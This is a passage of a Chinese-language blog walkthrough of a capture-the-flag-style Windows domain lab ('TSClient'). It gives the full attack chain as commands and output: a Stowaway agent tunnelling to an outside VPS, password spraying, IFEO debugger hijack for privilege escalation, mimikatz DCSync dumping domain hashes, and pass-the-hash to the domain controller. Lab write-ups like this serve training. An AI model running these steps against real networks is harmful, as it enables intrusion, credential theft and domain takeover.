<p><img alt="alt" loading="lazy" src="/images/CHUNQIUYUNJING/15.png"></p>
<p>进程注入后john上线cs：</p>
<p><img alt="alt" loading="lazy" src="/images/CHUNQIUYUNJING/16.png"></p>
<p>已经知道john在使用远程桌面，查看john的网络连接，可能有网络驱动器映射：</p>
<pre tabindex="0"><code>shell net use
</code></pre><p><img alt="alt" loading="lazy" src="/images/CHUNQIUYUNJING/17.png"></p>
<p>发现共享 TSCLIENT 的C盘，直接读敏感文件：</p>
<pre tabindex="0"><code>shell dir \\TSCLIENT\C
shell type \\TSCLIENT\C\credential.txt
</code></pre><p><img alt="alt" loading="lazy" src="/images/CHUNQIUYUNJING/18.png"></p>
<p>credential.txt：</p>
<pre tabindex="0"><code>xiaorang.lab\Aldrich:Ald@rLMWuy7Z!#

Do you know how to hijack Image?
</code></pre><p>这里有个hint提示 hijack image (映像劫持)</p>
<p>先上传 fscan.exe 到靶机，用system权限的用户扫一遍内网：</p>
<pre tabindex="0"><code>shell C:\Users\Public\fscan.exe -h 172.22.8.18/24

start infoscan
(icmp) Target 172.22.8.18     is alive
(icmp) Target 172.22.8.15     is alive
(icmp) Target 172.22.8.31     is alive
(icmp) Target 172.22.8.46     is alive
[*] Icmp alive hosts len is: 4
172.22.8.15:88 open
172.22.8.46:445 open
172.22.8.31:445 open
172.22.8.18:1433 open
172.22.8.15:445 open
172.22.8.18:445 open
172.22.8.46:139 open
172.22.8.31:139 open
172.22.8.15:139 open
172.22.8.31:135 open
172.22.8.46:135 open
172.22.8.15:135 open
172.22.8.18:139 open
172.22.8.18:135 open
172.22.8.46:80 open
172.22.8.18:80 open
[*] alive ports len is: 16
start vulscan
[*] NetBios 172.22.8.31     XIAORANG\WIN19-CLIENT         
[*] NetBios 172.22.8.15     [+] DC:XIAORANG\DC01           
[*] NetInfo 
[*]172.22.8.31
   [-&gt;]WIN19-CLIENT
   [-&gt;]172.22.8.31
[*] WebTitle http://172.22.8.18        code:200 len:703    title:IIS Windows Server
[*] NetInfo 
[*]172.22.8.46
   [-&gt;]WIN2016
   [-&gt;]172.22.8.46
[*] NetInfo 
[*]172.22.8.18
   [-&gt;]WIN-WEB
   [-&gt;]172.22.8.18
[*] NetBios 172.22.8.46     WIN2016.xiaorang.lab                Windows Server 2016 Datacenter 14393
[*] NetInfo 
[*]172.22.8.15
   [-&gt;]DC01
   [-&gt;]172.22.8.15
[*] WebTitle http://172.22.8.46        code:200 len:703    title:IIS Windows Server
[+] mssql 172.22.8.18:1433:sa 1qaz!QAZ
</code></pre><p>总结一下：</p>
<pre tabindex="0"><code>172.22.8.18  WIN-WEB 目前这台非域机器，已拿下
172.22.8.15  DC01 域控 
172.22.8.31  WIN19-CLIENT 域机器
172.22.8.46  WIN2016
</code></pre><p>用stowaway搭建内网代理方便后续渗透，靶机当跳板机，上传 windows_x64_agent.exe，vps上运行控制端 linux_x64_admin 开放2333端口：</p>
<pre tabindex="0"><code>./linux_x64_admin -l 2333 -s 114514
</code></pre><p>靶机连上vps控制端：</p>
<pre tabindex="0"><code>shell C:\Users\Public\windows_x64_agent.exe -c 121.40.46.63:2333 -s 114514 --reconnect 8 
</code></pre><p><img alt="alt" loading="lazy" src="/images/CHUNQIUYUNJING/20.png"></p>
<p>建立3456端口代理：</p>
<p><img alt="alt" loading="lazy" src="/images/CHUNQIUYUNJING/21.png"></p>
<p>再配置一下kali的proxychains，用之前 credential.txt 里的用户密码尝试喷洒：</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>proxychains4 crackmapexec smb 172.22.8.0/24 -u <span style="color:#e6db74">&#39;Aldrich&#39;</span> -p <span style="color:#e6db74">&#39;Ald@rLMWuy7Z!#&#39;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>SMB         172.22.8.15     <span style="color:#ae81ff">445</span>    DC01             <span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Windows Server <span style="color:#ae81ff">2022</span> Build <span style="color:#ae81ff">20348</span> x64 <span style="color:#f92672">(</span>name:DC01<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>domain:xiaorang.lab<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>signing:True<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>SMBv1:False<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>SMB         172.22.8.31     <span style="color:#ae81ff">445</span>    WIN19-CLIENT     <span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Windows <span style="color:#ae81ff">10</span> / Server <span style="color:#ae81ff">2019</span> Build <span style="color:#ae81ff">17763</span> x64 <span style="color:#f92672">(</span>name:WIN19-CLIENT<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>domain:xiaorang.lab<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>signing:False<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>SMBv1:False<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>SMB         172.22.8.46     <span style="color:#ae81ff">445</span>    WIN2016          <span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> xiaorang.lab<span style="color:#ae81ff">\A</span>ldrich:Ald@rLMWuy7Z!# STATUS_PASSWORD_EXPIRED 
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>proxychains<span style="color:#f92672">]</span> Strict chain  ...  121.40.46.63:3456 <span style="color:#f92672">[</span>proxychains<span style="color:#f92672">]</span> Strict chain  ...  121.40.46.63:3456  ...  172.22.8.18:445  ...  172.22.8.101:445  ...  OK
</span></span><span style="display:flex;"><span>SMB         172.22.8.18     <span style="color:#ae81ff">445</span>    WIN-WEB          <span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> WIN-WEB<span style="color:#ae81ff">\A</span>ldrich:Ald@rLMWuy7Z!# STATUS_LOGON_FAILURE 
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>proxychains<span style="color:#f92672">]</span> Strict chain  ...  121.40.46.63:3456 <span style="color:#f92672">[</span>proxychains<span style="color:#f92672">]</span> Strict chain  ...  121.40.46.63:3456  ...  172.22.8.102:445  ...  172.22.8.15:445  ...  OK
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>proxychains<span style="color:#f92672">]</span> Strict chain  ...  121.40.46.63:3456  ...  172.22.8.15:445  ...  OK
</span></span><span style="display:flex;"><span>SMB         172.22.8.15     <span style="color:#ae81ff">445</span>    DC01             <span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> xiaorang.lab<span style="color:#ae81ff">\A</span>ldrich:Ald@rLMWuy7Z!# STATUS_PASSWORD_EXPIRED 
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>proxychains<span style="color:#f92672">]</span> Strict chain  ...  121.40.46.63:3456 <span style="color:#f92672">[</span>proxychains<span style="color:#f92672">]</span> Strict chain  ...  121.40.46.63:3456  ...  172.22.8.31:445  ...  172.22.8.103:445  ...  OK
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>proxychains<span style="color:#f92672">]</span> Strict chain  ...  121.40.46.63:3456  ...  172.22.8.31:445  ...  OK
</span></span><span style="display:flex;"><span>SMB         172.22.8.31     <span style="color:#ae81ff">445</span>    WIN19-CLIENT     <span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> xiaorang.lab<span style="color:#ae81ff">\A</span>ldrich:Ald@rLMWuy7Z!# STATUS_PASSWORD_EXPIRED
</span></span></code></pre></div><p>密码都过期了，利用smbpasswd.py进行密码修改，否则无法利用rdp桌面登录：</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>cd /usr/share/doc/python3-impacket/examples/
</span></span><span style="display:flex;"><span>proxychains4 python3 smbpasswd.py xiaorang.lab/Aldrich:<span style="color:#e6db74">&#39;Ald@rLMWuy7Z!#&#39;</span>@172.22.8.15 -newpass <span style="color:#e6db74">&#39;qwert@12345&#39;</span>
</span></span></code></pre></div><p>远程桌面登录开个共享文件夹方便后续渗透：</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>proxychains4 rdesktop 172.22.8.46 -u Aldrich -d xiaorang.lab -p <span style="color:#e6db74">&#39;qwert@12345&#39;</span> -r disk:share<span style="color:#f92672">=</span>/home/w8nn9z/Desktop/shared
</span></span></code></pre></div><p><img alt="alt" loading="lazy" src="/images/CHUNQIUYUNJING/23.png"></p>
<p>powershell中执行命令来获取访问控制列表(ACL)的信息：</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>get-acl -path <span style="color:#e6db74">&#34;HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options&#34;</span> | fl *
</span></span></code></pre></div><p><img alt="alt" loading="lazy" src="/images/CHUNQIUYUNJING/24.png"></p>
<p>发现只要是登录认证成功的用户都有修改注册表的权限，这样就可以给放大镜设置debugger来进行提权，运行放大镜程序magnify.exe会先执行cmd.exe：</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>REG ADD <span style="color:#e6db74">&#34;HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\magnify.exe&#34;</span> /v Debugger /t REG_SZ /d <span style="color:#e6db74">&#34;C:\windows\system32\cmd.exe&#34;</span>
</span></span></code></pre></div><p><img alt="alt" loading="lazy" src="/images/CHUNQIUYUNJING/25.png"></p>
<pre tabindex="0"><code>type C\Users\Administrator\flag\flag02.txt
</code></pre><p>flag02.txt：</p>
<p><img alt="alt" loading="lazy" src="/images/CHUNQIUYUNJING/26.png"></p>
<p>172.22.8.46  WIN2016这台域机器被拿下，还剩DC01域控和WIN19-CLIENT，先查一下AD域管理员列表：</p>
<pre tabindex="0"><code>net group &#34;domain admins&#34; /domain
</code></pre><p><img alt="alt" loading="lazy" src="/images/CHUNQIUYUNJING/27.png"></p>
<p>当前机器的用户正好是域管理员，后续通过共享文件夹上传 mimikatz.exe：</p>
<p><img alt="alt" loading="lazy" src="/images/CHUNQIUYUNJING/28.png"></p>
<p>DCSync 获取用户凭证，导出所有用户信息：</p>
<pre tabindex="0"><code>C:\Users\Public\mimikatz.exe
lsadump::dcsync /domain:xiaorang.lab /all /csv
</code></pre><p><img alt="alt" loading="lazy" src="/images/CHUNQIUYUNJING/29.png"></p>
<p>横向移动到DC域控上：</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>cd /usr/share/doc/python3-impacket/examples/
</span></span><span style="display:flex;"><span>proxychains4 python3 smbexec.py -hashes :2c9d81bdcf3ec8b1def10328a7cc2f08 administrator@172.22.8.15
</span></span></code></pre></div><p>flag03.txt：</p>
<p><img alt="alt" loading="lazy" src="/images/CHUNQIUYUNJING/30.png"></p>
<p>参考资料：</p>
<p><a href="https://www.s1mh0.cn/blog/index.php/2024/11/30/cqyj_tsclient/">https://www.s1mh0.cn/blog/index.php/2024/11/30/cqyj_tsclient/</a></p>
<p><a href="https://fushuling.com/index.php/2023/08/29/%e6%98%a5%e7%a7%8b%e4%ba%91%e5%a2%83%c2%b7tsclient/">https://fushuling.com/index.php/2023/08/29/%e6%98%a5%e7%a7%8b%e4%ba%91%e5%a2%83%c2%b7tsclient/</a></p>


  </div>

  <footer class="post-footer">
    <ul class="post-tags">
    </ul>
  </footer>
</article>
    </main>
    
<footer class="footer">
        <span>&copy; 2025 <a href="https://z9nn8w.github.io/">w8nn9z Blog</a></span> · 

    <span>
        Powered by
        <a href="https://gohugo.io/" rel="noopener noreferrer" target="_blank">Hugo</a> &
        <a href="https://github.com/adityatelange/hugo-PaperMod/" rel="noopener" target="_blank">PaperMod</a>
    </span>
</footer>
<a href="#top" aria-label="go to top" title="Go to Top (Alt + G)" class="top-link" id="top-link" accesskey="g">
    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentColor">
        <path d="M12 6H0l6-6z" />
    </svg>
</a>

<script>
    let menu = document.getElementById('menu')
    if (menu) {
        menu.scrollLeft = localStorage.getItem("menu-scroll-position");
        menu.onscroll = function () {
            localStorage.setItem("menu-scroll-position", menu.scrollLeft);
        }
    }

    document.querySelectorAll('a[href^="#"]').forEach(anchor => {
        anchor.addEventListener("click", function (e) {
            e.preventDefault();
            var id = this.getAttribute("href").substr(1);
            if (!window.matchMedia('(prefers-reduced-motion: reduce)').matches) {
                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView({
                    behavior: "smooth"
                });
            } else {
                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView();
            }
            if (id === "top") {
                history.replaceState(null, null, " ");
            } else {
                history.pushState(null, null, `#${id}`);
            }
        });
    });

</script>
<script>
    var mybutton = document.getElementById("top-link");
    window.onscroll = function () {
        if (document.body.scrollTop > 800 || document.documentElement.scrollTop > 800) {
            mybutton.style.visibility = "visible";
            mybutton.style.opacity = "1";
        } else {
            mybutton.style.visibility = "hidden";
            mybutton.style.opacity = "0";
        }
    };

</script>
<script>
    document.getElementById("theme-toggle").addEventListener("click", () => {
        if (document.body.className.includes("dark")) {
            document.body.classList.remove('dark');
            localStorage.setItem("pref-theme", 'light');
        } else {
            document.body.classList.add('dark');
            localStorage.setItem("pref-theme", 'dark');
        }
    })

</script>
</body>

</html>
